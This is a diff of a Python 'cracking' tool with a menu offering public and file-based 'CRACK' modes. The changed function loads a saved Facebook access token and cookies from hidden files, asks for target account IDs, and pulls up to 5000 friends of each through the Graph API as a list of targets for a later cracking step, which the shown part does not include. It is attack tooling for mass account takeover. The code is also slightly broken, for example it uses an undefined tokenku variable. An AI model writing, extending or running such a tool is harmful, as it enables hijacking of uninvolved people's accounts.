@@ -616,7 +616,7 @@ def menu():
     print(logo)
     print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
     print('\033[0;97m-----------------------------------------------')
-    print(f"""[\u001b[36m1\033[1;37m] PUBLIC CRACK """)
+    print(f"""[\u001b[36m1\033[1;37m] PUBLIC CRACKING """)
     print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
     print(f"""[\u001b[36m2\033[1;37m] CONTACT ADMIN""")
     print("""[\u001b[36m0\033[1;37m] LOGOUT""")
@@ -644,60 +644,60 @@ def menu():
         back()
 
 # ------------[ PUBLIC-CRACKING ]-----------------#
- def public_cracking():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		os.system('clear')
-		banner()
-		info()
-		jum = int(input(' [\u001b[36m•\033[1;37m] Enter The Number Of Idz You Want To Clone : '))
-	except ValueError:
-		linex()
-		animation( ' >> Only Letters Are Accepted ')
-		back()
-	if jum<1 or jum>100:
-		linex()
-		animation(' >> Id Is Not Not Public ')
-		back()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		linex()
-		kl = input(' [\u001b[36m•\033[1;37m] Enter Id '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			linex()
-			animation(' [×] Connection Lost ')
-			exit()
-	try:
-		linex()
-		print(f' [\u001b[36m•\033[1;37m] Total Idz \u001b[36m'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		linex()
-		animation(' [×] Connection Lost ')
-		back()
-	except (KeyError,IOError):
-		animation(f' [×] Friendlist Is Not Public {x}')
-		time.sleep(3)
-		back()
- 
+def public_cracking():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+    except IOError:
+        exit()
+    try:
+        os.system('clear')
+        banner()
+        info()
+        jum = int(input(' [\u001b[36m•\033[1;37m] Enter The Number Of Idz You Want To Clone : '))
+    except ValueError:
+        linex()
+        animation( ' >> Only Letters Are Accepted ')
+        back()
+    if jum<1 or jum>100:
+        linex()
+        animation(' >> Id Is Not Not Public ')
+        back()
+    ses=requests.Session()
+    yz = 0
+    for met in range(jum):
+        yz+=1
+        linex()
+        kl = input(' [\u001b[36m•\033[1;37m] Enter Id '+str(yz)+' : ')
+        uid.append(kl)
+    for userr in uid:
+        try:
+            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+            for mi in col['friends']['data']:
+                try:
+                    iso = (mi['id']+'|'+mi['name'])
+                    if iso in id:pass
+                    else:id.append(iso)
+                except:continue
+        except (KeyError,IOError):
+            pass
+        except requests.exceptions.ConnectionError:
+            linex()
+            animation(' [×] Connection Lost ')
+            exit()
+    try:
+        linex()
+        print(f' [\u001b[36m•\033[1;37m] Total Idz \u001b[36m'+str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        linex()
+        animation(' [×] Connection Lost ')
+        back()
+    except (KeyError,IOError):
+        animation(f' [×] Friendlist Is Not Public {x}')
+        time.sleep(3)
+        back()
+
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 # import time  # Import the time module
